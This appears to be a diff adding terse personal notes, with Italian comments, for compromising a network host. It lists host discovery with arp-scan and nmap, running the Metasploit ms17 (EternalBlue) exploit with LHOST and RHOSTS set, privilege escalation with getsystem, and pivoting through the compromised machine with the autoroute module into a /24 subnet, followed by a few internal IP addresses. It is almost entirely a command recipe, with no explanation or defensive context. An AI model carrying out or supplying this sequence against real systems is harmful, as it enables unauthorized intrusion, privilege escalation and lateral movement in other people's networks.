@@ -1,0 +1,29 @@
+sudo arp-scan -l
+sudo nmap -A <target>
+
+sudo dhclient
+
+msfconsole 
+-> search ms17
+-> use 8
+-> options
+-> set LHOST <my ip>
+-> set RHOSTS <target>
+-> run
+-> route
+-> getsystem
+-> getinfo
+-> sysinfo
+-> bg     (manda in background)
+-> search autoroute (modulo per trasformare la macchina attaccata in un router)
+  -> post/multi/manage/autoroute  (richiedera sessione e subnet)
+     set session 1
+     set subnet  192.168.32.0
+     set netmask 255.255.255.0
+-> show sessions     
+
+172.27.112.1
+172.27.116.1
+172.27.127.1
+
+
